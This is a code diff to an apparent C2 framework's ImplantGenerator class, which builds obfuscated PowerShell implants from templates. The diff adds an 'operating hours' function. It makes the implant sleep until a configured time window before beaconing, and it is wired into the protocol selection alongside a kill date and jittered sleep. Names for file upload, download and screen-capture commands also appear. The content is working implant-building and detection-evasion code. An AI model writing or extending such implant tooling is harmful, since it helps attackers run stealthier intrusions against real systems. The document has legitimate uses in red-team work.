@@ -40,7 +40,8 @@ class ImplantGenerator:
         "obf_upload_file": "upload-file",
         "obf_download_file": "download-file",
         "obf_screen_capture": "screen-capture",
-        "obf_kill_date": "implant_kill_date"
+        "obf_kill_date": "implant_kill_date",
+        "obf_operating_hours": "working_time_function"
         }
 
     execute_command = '''
@@ -88,9 +89,36 @@ function {{ ron.obf_kill_date }}{
     }  
 }
 '''
+    operating_hours = '''
+function {{ ron.obf_operating_hours }}(){
+    #Write-host "Are we at working time yet?"
+    while ($true){
+        $start_string = "{{ operating_hours['oh_start'] }}:00"
+        $stop_string =  "{{ operating_hours['oh_stop'] }}:00"
+        $start = [datetime]::parseexact($start_string, 'HH:mm:ss', $null)
+        $stop = [datetime]::parseexact($stop_string, 'HH:mm:ss', $null)
+    
+        if ($start -lt $stop){
+            #Write-Host "9-5"
+            if( ( (get-date) -ge $start ) -And ((get-date) -le $stop) ){  
+            return }
+        } else {
+            $stop = $stop.AddDays(1)
+            # Write-Host "5-9"
+            # Write-Host $stop
+            if ( ((get-date) -lt $stop) -And ( (Get-Date) -gt $start ) ) { 
+            return}
+        }
+        start-sleep(3);
+    }
+}
+'''
 
     select_protocol = '''
 function {{ ron.obf_select_protocol }}($b){
+    {% if operating_hours['oh_start'] is defined %}
+{{ ron.obf_operating_hours }}
+    {% endif %}
     {% if kill_date %}{{ ron.obf_kill_date }}{% endif %}
     sleep (Get-Random -Minimum (${{ ron.obf_sleep }} *0.90) -Maximum (${{ ron.obf_sleep }} *1.10))
     return get-random($b)
@@ -181,6 +209,9 @@ while($true){
         if implant_data['kill_date'] is not None:
             implant_functions.append(self.kill_date)
 
+        if len(implant_data['operating_hours']) == 2:
+            implant_functions.append(self.operating_hours)
+
         constructed_implant = self._manage_implant_function_order(implant_data, implant_functions)
 
         protocol_string = ""
@@ -248,6 +279,7 @@ while($true){
             proto_core=protocol_switch,
             obfuscation_level=implant_data['obfuscation_level'],
             obf_variables=variable_list,
+            operating_hours=implant_data['operating_hours'],
             kill_date=implant_data['kill_date'],
             kill_date_encoded=base64.b64encode(str(implant_data['kill_date']).encode()).decode()
         )
